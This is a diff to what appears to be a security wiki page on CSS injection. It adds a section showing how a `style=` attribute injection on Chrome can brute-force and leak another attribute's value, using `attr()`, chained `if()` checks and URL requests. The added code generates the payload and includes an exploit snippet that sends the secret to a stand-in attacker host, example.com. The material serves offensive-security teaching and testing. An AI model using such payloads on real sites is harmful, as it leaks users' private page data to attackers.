@@ -52,7 +52,7 @@ CSS can be loaded in a few different ways, and sometimes the details matter.
 
 1. `<link rel="stylesheet" href="style.css">`: Loads CSS content from a URL (`href=`). This is only vulnerable if you can control the attribute enough to redirect it to any of your arbitrary content (or directly with an HTML-Injection), or if you have an injection dynamically generated CSS content somehow.
 2. `<style>`: Using an sanitized HTML-injection, you may still be able to write a `<style>` tag with arbitrary content. Another option is if user input ends up in partially-trusted content and you can escape the context. (note: HTML-encoding content won't work here, even though it is inside HTML)
-3. `style=` attribute: Inside of a [style attribute](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/style), it is _not possible_ to add selectors and leak content. You can only change the style of the element it is an attribute of, to for example, make it take up the whole screen with a background image.
+3. `style=` attribute: Inside of a [style attribute](https://developer.mozilla.org/en-US/docs/Web/HTML/Global_attributes/style), it is _not possible_ to add selectors and leak content. You can only change the style of the element it is an attribute of, to for example, make it take up the whole screen with a background image. There is one small edge case using the recent `if()` statements to brute force attributes on the same element as this attribute (see [#stylesheet-vs.-less-than-style-greater-than-vs.-style](css-injection.md#stylesheet-vs.-less-than-style-greater-than-vs.-style "mention")).
 
 ### Escaping string context
 
@@ -168,6 +168,39 @@ Leak structure of unknown data
 The tool below implements all this logic incredibly and has some features for inlining fonts as well with the `/static` endpoint. Check out the blog post to understand how it works:
 
 {% embed url="https://adragos.ro/fontleak/" %}
+
+### `style=` attribute leak with `if()`
+
+An injection into the `style=` **attribute** is very limited, because selectors won't be available. On Chrome, you can still use some of the more recent features of [`attr()`](https://developer.mozilla.org/en-US/docs/Web/CSS/attr) to get an any attribute on the same element's value, then compare against it with chained [`if()`](https://developer.mozilla.org/en-US/docs/Web/CSS/if) statements to fetch different URLs.
+
+This allows you to brute-force a value if there aren't too many possibilities:
+
+{% code title="Generate attribute value" %}
+```javascript
+const possibilities = Array.from({ length: 100 }, (_, i) => i);
+const attribute = "data-secret";
+const attacker = "example.com";
+
+const chain = possibilities.reduce(
+    (acc, v) => `if(style(--val:"${v}"):url(//${attacker}/${v});else:${acc})`,
+    'url(//example.com/unknown)'
+);
+const style = `--val:attr(data-secret);--steal:${chain};background:image-set(var(--steal))`
+console.log(style);  // 4967 bytes
+```
+{% endcode %}
+
+{% code title="Exploit example" %}
+```html
+<div data-secret="42" style='
+  --val: attr(data-secret);
+  --steal: if(style(--val:"99"):url(//example.com/99);else:if(...
+  background: image-set(var(--steal));
+'>
+```
+{% endcode %}
+
+This makes a request to https://example.com/42, leaking the secret to the attacker.
 
 ## CSP Bypasses
 
